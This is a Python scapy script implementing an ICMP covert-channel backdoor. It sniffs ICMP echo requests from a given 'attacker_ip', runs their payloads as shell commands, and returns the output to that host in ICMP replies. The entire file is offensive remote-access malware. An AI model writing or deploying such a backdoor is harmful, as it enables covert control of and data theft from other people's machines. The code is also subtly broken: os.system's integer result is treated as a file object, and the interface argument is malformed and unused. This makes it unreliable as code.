from scapy.all import sr,IP,ICMP,Raw,sniff 
import argparse
import os

ICMP_ID = 13170 
time_to_live = 64

def icmpshell(packet):
    if packet[IP].src == args.attacker_ip and packet[ICMP].type == 8 and packet[ICMP].id == ICMP_ID and packet[Raw].load:
        command = (packet[Raw].load).decode('utf-8', errors='ignore')
        payload = os.system(command).readlines()
        print(payload)
        icmppacket = (IP(dst=args.attacker_ip, ttl=time_to_live)/ICMP(type=0, id=ICMP_ID)/Raw(load=payload))
        print(icmppacket)
        sr(icmppacket, timeout=0, verbose=0)
    else:
        pass

if __name__ == "__main__":
    try:
        from scapy.all import sr,IP,ICMP,Raw,sniff
    except ImportError:
        print('[!] Please install the python3 scapy module')
        print('[!] use the command pip3 install scapy')
        exit()
        

    #checks arguments passed in by user
    parser = argparse.ArgumentParser()
    parser.add_argument('-i' '--interface', type=str, required=True, help="Listener (virtual) Network Interface eth0")
    parser.add_argument('-d', '--attacker_ip', type=str, required=True, help="Destination IP adress")
    args = parser.parse_args()

    print('[+] ICMP listener started')
    sniff(prn=icmpshell, filter='icmp', store='0')

